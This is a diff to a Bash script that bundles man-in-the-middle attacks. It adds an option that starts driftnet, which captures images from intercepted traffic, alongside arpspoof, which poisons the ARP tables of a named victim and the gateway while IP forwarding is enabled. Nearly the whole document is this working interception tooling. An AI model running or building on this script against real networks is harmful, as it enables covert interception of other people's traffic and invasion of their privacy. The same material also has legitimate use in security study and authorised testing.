@@ -3,13 +3,14 @@
 #===============================================================================================
 # System required: Linux
 # Packages required: arpspoof
+# Optional packages: driftnet
 # Description: Bundles several man-in-the-middle scripts.
 # Author: dsfranzi
 #===============================================================================================
 
 RCFILE="/tmp/arpspoofex.rc"
 
-while getopts "hnv:r:i:" opt 
+while getopts "hndv:r:i:" opt 
 do
 	case $opt in
 		h)	# Help
@@ -25,6 +26,8 @@ do
 			echo -e "-n\t\t\tNo Forwarding"
 			echo -e "-r <IP Address>\t\tRouter IP Address."
 			echo -e "\t\t\tStandard: the default gateway IP address if not set."
+			echo ""
+			echo -e "-d\t\t\tStart Driftnet"
 			exit 1
 		;;
 		i)	# Interface
@@ -39,13 +42,17 @@ do
 		r)	# Router
 			GATEWAY=$OPTARG
 		;;
+		### Optional Scripts
+		d)	# Driftnet
+			DRIFTNET=true
+		;;
 	esac
 done
 
 # Requirements
 if [ -z "$VICTIM" ]
 then
-	echo "-d Argument not provided."
+	echo "-v Argument not provided."
 	exit 1
 elif [ -z "$INTERFACE" ]
 then
@@ -77,6 +84,12 @@ echo $FORWARD > /proc/sys/net/ipv4/ip_forward
 echo "startup_message off" > $RCFILE
 echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
 echo -e "screen -t arpspoof arpspoof -i $INTERFACE -r -t $GATEWAY $VICTIM" >> $RCFILE
+
+if [ "$DRIFTNET" == "true" ]
+then
+	driftnet -i $INTERFACE &
+fi
+
 echo -e "screen -r -t Main" >> $RCFILE
 
 screen -c $RCFILE
